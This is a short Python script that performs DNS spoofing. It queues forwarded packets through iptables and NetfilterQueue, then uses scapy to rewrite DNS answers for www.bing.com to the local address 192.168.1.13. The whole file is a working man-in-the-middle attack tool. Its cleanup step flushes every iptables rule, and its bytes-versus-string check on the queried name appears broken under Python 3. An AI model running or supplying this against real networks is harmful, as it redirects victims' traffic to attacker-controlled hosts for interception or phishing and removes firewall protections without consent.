#!/usr/bin/env python3

import os
import netfilterqueue
import scapy.all as scapy

# Function to set up iptables rule
def set_iptables_rule():
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

# Function to flush iptables rule
def flush_iptables_rule():
    os.system("sudo iptables --flush")

# Function to process packets
def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNSQR].qname
            if "www.bing.com" in qname:
                print("[+] Spoofing target")
                answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.13")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Modify packet fields for redirection
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

                packet.set_payload(bytes(scapy_packet))

        packet.accept()

    except Exception as e:
        print(f"[-] An error occurred: {e}")
        packet.drop()

# Main execution
if __name__ == "__main__":
    try:
        set_iptables_rule()  # Set up iptables rule

        # Bind to the queue and process packets
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

    except KeyboardInterrupt:
        pass

    finally:
        flush_iptables_rule()  # Flush iptables rule when script exits
